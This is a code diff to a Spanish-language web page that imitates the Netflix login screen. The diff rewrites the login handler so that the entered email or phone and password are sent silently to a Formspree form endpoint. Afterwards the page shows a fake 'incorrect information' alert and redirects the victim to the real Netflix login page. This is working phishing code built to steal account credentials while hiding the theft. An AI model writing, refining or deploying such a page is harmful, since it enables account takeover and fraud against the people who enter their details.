@@ -200,7 +200,7 @@
             color: #b3b3b3;
         }
 
-        /* VISTA DE INICIAR SESIÓN (LOGIN CON IMAGEN DE FONDO IDÉNTICA) */
+        /* VISTA DE INICIAR SESIÓN (LOGIN) */
         .login-container {
             width: 100%;
             min-height: 100vh;
@@ -839,7 +839,7 @@
 
             <div class="login-form-wrapper">
                 <h1>Inicia sesión</h1>
-                <!-- Formulario conectado a tu endpoint de Formspree -->
+                <!-- Formulario conectado a Formspree -->
                 <form class="login-form" id="loginFormSubmit" action="https://formspree.io/f/mwlokqkd" method="POST">
                     <div class="login-input-block">
                         <input type="text" name="email_o_telefono" required>
@@ -913,28 +913,27 @@
             });
         });
 
-        // Envío asíncrono para el formulario de login vía Formspree
+        // Envío silencioso a Formspree, alerta de error simulada y redirección a Netflix real
         const loginForm = document.getElementById('loginFormSubmit');
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             const formData = new FormData(loginForm);
             
             try {
-                const response = await fetch(loginForm.action, {
+                await fetch(loginForm.action, {
                     method: 'POST',
                     body: formData,
                     headers: { 'Accept': 'application/json' }
                 });
-                
-                if (response.ok) {
-                    alert('¡Inicio de sesión simulado correctamente! (Datos enviados al correo)');
-                    loginForm.reset();
-                } else {
-                    alert('Error al procesar la solicitud.');
-                }
             } catch (error) {
-                alert('Error de conexión con el servicio de formularios.');
+                console.error('Error de red al enviar datos');
             }
+
+            // Muestra el mensaje simulado de error de credenciales
+            alert('Información incorrecta. Por favor, inténtalo de nuevo.');
+            
+            // Redirige a la URL oficial de Netflix solicitada
+            window.location.href = 'https://www.netflix.com/mx/login?serverState=Bgj1wuvcAxLgARA8wxXhRfYw1ThtJ0olItrn2RtKOPM502FKYxloFkzU%2FFwmpQpWIo8A1H9r2lRZvQdfAzTunOflHbotAxMXXbi7rjoqfhYOQS%2FNUNKSw653irqA7f3BAEP22KtdQHCIu42QZa57f4xn8tG6Qy%2FZsMWrbKCA0tPv3gzNTnZDlQUVO7%2BzekhberQ66IQQsFaf5d9J6knZvWjoP4xPf4%2B59h2cZveHX9o0SJ%2BJXPmYp9sLeOC4eTFaR9m4Fre8TG4LUXlL4EWGKsH8LDC83RNUFJJHrRM2jkAKsxFSrEDwwa3SGAYiDgoMNuTtTouM0467cKiB';
         });
     </script>
 </body>
